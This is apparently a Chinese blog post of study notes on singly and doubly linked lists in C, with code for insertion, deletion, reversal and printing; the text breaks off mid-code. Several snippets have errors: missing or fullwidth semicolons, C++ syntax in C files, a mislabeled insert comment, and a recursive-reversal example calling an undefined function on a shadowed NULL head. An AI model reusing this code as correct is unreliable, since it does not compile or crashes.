<p>节点是一个数据类型，他有两个域，一个用来储存数据，一个用来存储指针，在c中我们将这种数据类型定义为结构体</p>
<h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> data；</span><br><span class="line">    Node* link;<span class="comment">//next</span></span><br><span class="line">&#125;</span><br><span class="line">Node* A;<span class="comment">//第一件事，声明一个指向头节点的指针，一个将存储头节点地址的变量</span></span><br><span class="line">A=<span class="literal">NULL</span>;<span class="comment">//最初没有元素，使指针不指向具体节点，因此列表为空</span></span><br><span class="line">Node* temp=(Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));<span class="comment">//创建一个节点.c++建议用new：Node* temp=new Node();</span></span><br><span class="line">(*temp).data=<span class="number">2</span>;<span class="comment">//temp-&gt;data=2;</span></span><br><span class="line">(*temp).link=<span class="literal">NULL</span>;<span class="comment">//此时第一个节点的link指向NULL</span></span><br><span class="line">A=temp;<span class="comment">//temp是用来暂时存储节点地址的，一旦链接调整完成，temp可以用作其他目的</span></span><br><span class="line"><span class="comment">//继续</span></span><br><span class="line">temp=new Node();<span class="comment">//相当于在列表末尾插入</span></span><br><span class="line">temp-&gt;data=<span class="number">4</span>;</span><br><span class="line">temp-&gt;link=Null;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">遍历列表代码逻辑</span></span><br><span class="line"><span class="comment">Node *temp=A;A永远不会被改变，存储头节点的地址值从不应该被修改</span></span><br><span class="line"><span class="comment">while(temp1-&gt;link!=Null)&#123;</span></span><br><span class="line"><span class="comment">temp1=temp1-&gt;link;到达下一个节点，，到达末尾</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h4 id="头部插入"><a href="#头部插入" class="headerlink" title="头部插入"></a>头部插入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span><span class="comment">//在c++中只用写Node* next</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span><span class="comment">//global variable,can be accessed anywhere</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    Node* temp=(Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    temp-&gt;data=x;</span><br><span class="line">    temp-&gt;next=head;</span><br><span class="line">    head=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> 	<span class="title">Node</span>* <span class="title">temp</span>=</span>head;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is: &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,temp-&gt;data);</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    head=<span class="literal">NULL</span>;<span class="comment">//empty list;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many numbers?\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> n,i,x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter the number \n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        Insert(x);</span><br><span class="line">        Print();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span>&#123;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* next;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">Node* <span class="title">Insert</span><span class="params">(Node* head,<span class="type">int</span> x)</span></span>&#123;<span class="comment">//(Node** head,int x)</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Node</span>* temp=(Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    temp-&gt;data=x;</span><br><span class="line">    temp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(head!=<span class="literal">NULL</span>)temp-&gt;next=head;<span class="comment">//if(*head!=NULL)temp-&gt;next=*head</span></span><br><span class="line">    head=temp;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Print</span><span class="params">(Node* head)</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;List is: &quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(head!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,head-&gt;data);</span><br><span class="line">        head=head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Node* head=<span class="literal">NULL</span>;<span class="comment">//empty list;</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How many numbers?\n&quot;</span>);</span><br><span class="line">    <span class="type">int</span> n,i,x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Enter the number \n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">        head=<span class="built_in">Insert</span>(head,x);</span><br><span class="line">        <span class="built_in">Print</span>(head);<span class="comment">//两个头节点是不一样的</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任意位置插入"><a href="#任意位置插入" class="headerlink" title="任意位置插入"></a>任意位置插入</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span><span class="comment">//globl</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(<span class="type">int</span> data,<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    Node* temp1=new Node();<span class="comment">//Node* temp=(Node*)malloc(sizeof(struct Node));</span></span><br><span class="line">    temp1-&gt;data=data;</span><br><span class="line">    temp1-&gt;next= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        temp1-&gt;next=head;</span><br><span class="line">        head=temp1;<span class="comment">//head将变得不在任何位置都能直接访问</span></span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//所以函数调用，需要返回一些值来指示更新后的head</span></span><br><span class="line">    &#125;</span><br><span class="line">    Node* temp2 =head;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-2</span>;i++)&#123;<span class="comment">//转到第n-1节点，头节点不参加循环 </span></span><br><span class="line">        temp2=temp2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    temp1-&gt;next=temp2-&gt;next;</span><br><span class="line">    temp2-&gt;next=temp1;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;</span><br><span class="line">    Node* temp=head;</span><br><span class="line">    <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,temp-&gt;data);</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    head=<span class="literal">NULL</span>;<span class="comment">//empty list</span></span><br><span class="line">    Insert(<span class="number">2</span>,<span class="number">1</span>);<span class="comment">//2</span></span><br><span class="line">    Insert(<span class="number">3</span>,<span class="number">2</span>);<span class="comment">//2,3</span></span><br><span class="line">    Insert(<span class="number">4</span>,<span class="number">1</span>);<span class="comment">//4,2,3</span></span><br><span class="line">    Insert(<span class="number">5</span>,<span class="number">2</span>);<span class="comment">//4,5,2,3</span></span><br><span class="line">    Print();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="任意一个位置删除节点"><a href="#任意一个位置删除节点" class="headerlink" title="任意一个位置删除节点"></a>任意一个位置删除节点</h4><p>删除节点是有两个重点：</p>
<p>1.修复链接，是节点不再成为链表的一部分(Fix the links)</p>
<p>2.释放空间，把节点占据的空间从内存中释放(Free the space)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span><span class="comment">//global</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Insert</span><span class="params">(<span class="type">int</span> data)</span>&#123;<span class="comment">//insert an integer at end of list</span></span><br><span class="line">    Node* temp=(Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    temp-&gt;data=data;</span><br><span class="line">    temp-&gt;next=head;</span><br><span class="line">    head=temp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;<span class="comment">//print all</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> 	<span class="title">Node</span>* <span class="title">temp</span>=</span>head;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;List is: &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %d&quot;</span>,temp-&gt;data);</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Delete</span><span class="params">(<span class="type">int</span> n)</span>&#123;<span class="comment">//delete node at position n</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp1</span>=</span>head;</span><br><span class="line">    <span class="keyword">if</span>(n==<span class="number">1</span>)&#123;</span><br><span class="line">        head=temp1-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(temp1);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-2</span>;i++)&#123;</span><br><span class="line">        temp1=temp1-&gt;next;</span><br><span class="line">    &#125;<span class="comment">//(n-1)th node</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp2</span>=</span>temp1-&gt;next;<span class="comment">//nth node</span></span><br><span class="line">    temp1-&gt;next=temp2-&gt;next;<span class="comment">//(n+1)th node</span></span><br><span class="line">    <span class="built_in">free</span>(temp2);<span class="comment">//delete</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    head =<span class="literal">NULL</span>;<span class="comment">//empty</span></span><br><span class="line">    Insert(<span class="number">2</span>);</span><br><span class="line">    Insert(<span class="number">4</span>);</span><br><span class="line">    Insert(<span class="number">5</span>);</span><br><span class="line">    Insert(<span class="number">6</span>);<span class="comment">//list: 2,3,5,6</span></span><br><span class="line">    Print();</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">char</span> a;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter a position \n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">    Delete(n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="反转列表-迭代"><a href="#反转列表-迭代" class="headerlink" title="反转列表(迭代)"></a>反转列表(迭代)</h4><p><a href="https://zhuanlan.zhihu.com/p/355048733">递归和迭代都是重复计算的一种方式，但是实现方式有所不同。</a><a href="https://blog.csdn.net/cpc784221489/article/details/90702063">递归是一种重复递推与回归过程的结构，而迭代则是一种重复循环与更新状态的结构。</a></p>
<p><a href="https://blog.csdn.net/cpc784221489/article/details/90702063">递归是指在函数定义中使用函数自身的方法，通过在循环中调用自身来实现重复计算。而迭代则是通过某段代码实现循环，利用变量的原值推算出变量的一个新值。</a></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span><span class="comment">//global</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">(Node* head)</span>&#123;<span class="comment">//print all</span></span><br><span class="line">   <span class="keyword">while</span>(head!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">   	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,head-&gt;data);</span><br><span class="line">	   head=head-&gt;next; </span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Node* <span class="title function_">Insert</span><span class="params">(Node* head,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    Node *temp=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    temp-&gt;data=data;</span><br><span class="line">    temp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    	head=temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		Node* temp1=head;</span><br><span class="line">		<span class="keyword">while</span>(temp1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			temp1=temp1-&gt;next;	</span><br><span class="line">		&#125;</span><br><span class="line">		temp1-&gt;next=temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> Node* <span class="title function_">Reverse</span><span class="params">(<span class="keyword">struct</span> Node* head)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">current</span>,*<span class="title">prev</span>,*<span class="title">next</span>;</span></span><br><span class="line">    current=head;</span><br><span class="line">    prev=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(current!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        next=current-&gt;next;</span><br><span class="line">        current-&gt;next=prev;<span class="comment">//*(current).next</span></span><br><span class="line">        prev=current;<span class="comment">//重新设置遍历列表</span></span><br><span class="line">        current=next;</span><br><span class="line">    &#125;</span><br><span class="line">    head=prev;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>=</span><span class="literal">NULL</span>;</span><br><span class="line">    head=Insert(head,<span class="number">2</span>);</span><br><span class="line">    head=Insert(head,<span class="number">4</span>);</span><br><span class="line">    head=Insert(head,<span class="number">6</span>);</span><br><span class="line">    head=Insert(head,<span class="number">8</span>);</span><br><span class="line">    Print(head);</span><br><span class="line">    head=Reverse(head);</span><br><span class="line">    Print(head);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="打印列表-递归"><a href="#打印列表-递归" class="headerlink" title="打印列表(递归)"></a>打印列表(递归)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">(<span class="keyword">struct</span> Node* p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;<span class="comment">//递归结束</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">    Print(p-&gt;next);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReversePrint</span><span class="params">(<span class="keyword">struct</span> Node* p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ReversePrint(p-&gt;next);<span class="comment">//一次次调用自身函数，从最里层到最外层依次输出，相当于反转</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">Node* <span class="title function_">Insert</span><span class="params">(Node* head,<span class="type">int</span> data)</span>&#123;</span><br><span class="line">    Node *temp=(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    temp-&gt;data=data;</span><br><span class="line">    temp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">    	head=temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		Node* temp1=head;</span><br><span class="line">		<span class="keyword">while</span>(temp1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			temp1=temp1-&gt;next;	</span><br><span class="line">		&#125;</span><br><span class="line">		temp1-&gt;next=temp;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>*  <span class="title">head</span>=</span><span class="literal">NULL</span>;</span><br><span class="line">    head=Insert(head,<span class="number">2</span>);</span><br><span class="line">    head=Insert(head,<span class="number">4</span>);</span><br><span class="line">    head=Insert(head,<span class="number">6</span>);</span><br><span class="line">    head=Insert(head,<span class="number">5</span>);</span><br><span class="line">    Print(head);</span><br><span class="line">	ReversePrint(head); </span><br><span class="line">&#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<h4 id="反转列表-递归"><a href="#反转列表-递归" class="headerlink" title="反转列表(递归)"></a>反转列表(递归)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Reverse</span><span class="params">(<span class="keyword">struct</span> Node* p)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;<span class="comment">//exit condition</span></span><br><span class="line">        head=p;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Reverse(p-&gt;next);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">q</span>=</span>p-&gt;next;<span class="comment">//p-&gt;nexct-&gt;next=p</span></span><br><span class="line">    q-&gt;next=p;</span><br><span class="line">    p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>=</span><span class="literal">NULL</span>;</span><br><span class="line">    Insert(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">    Insert(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">    Insert(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line">    Insert(<span class="number">1</span>,<span class="number">6</span>);</span><br><span class="line">    Reverse(head);</span><br><span class="line">    Print(head);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="双向链表-Doubly-Linked-List"><a href="#双向链表-Doubly-Linked-List" class="headerlink" title="双向链表(Doubly Linked List)"></a>双向链表(Doubly Linked List)</h3><p>单链表结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-12 102015.png)</p>
<p>双链表结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prev</span>;</span><span class="comment">//指向上一个节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>![](<a href="https://cdn.jsdelivr.net/gh/jangfan/picb@main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://cdn.jsdelivr.net/gh/jangfan/picb@main/屏幕截图</a> 2023-05-12 103204.png)</p>
<p>双链表的优点：</p>
<p>如果有指向任何节点的指针，可以反向查询(Reverse look-up)</p>
<h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><p>Insert At Head(x)写一个在头部插入的函数，取一个整型作为参数</p>
<p>Insert At Tail(x)在末尾插入</p>
<p>Print()打印函数,从头到尾遍历</p>
<p>ReversePrint()反向打印函数，反向遍历，验证是否正确创建了每个节点的反向链接</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">   <span class="type">int</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">head</span>;</span><span class="comment">//global variable -pointer to head node</span></span><br><span class="line"><span class="keyword">struct</span> Node*  <span class="title function_">GetNewNode</span><span class="params">(<span class="type">int</span> x)</span>&#123;<span class="comment">//局部变量存在栈区，我们无法控制其生命周期</span></span><br><span class="line">    <span class="comment">//local variable</span></span><br><span class="line">    <span class="comment">//will be cleared from memeory when function call will finish</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">newNode</span>=</span>(<span class="keyword">struct</span> Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> Node));</span><br><span class="line">    newNode-&gt;data=x;</span><br><span class="line">    newNode-&gt;prev=<span class="literal">NULL</span>;</span><br><span class="line">    newNode-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InsertAtHead</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">newNode</span> =</span>GetNewNode(x);</span><br><span class="line">    <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        head=newNode;</span><br><span class="line">        <span class="keyword">return</span>;<span class="comment">//返回或退出</span></span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;prev=newNode;</span><br><span class="line">    newNode-&gt;next=head;</span><br><span class="line">    head=newNode;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Print</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>* <span class="title">temp</span>=</span>head;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Forward &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(temp!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,temp-&gt;data);</span><br><span class="line">        temp=temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title 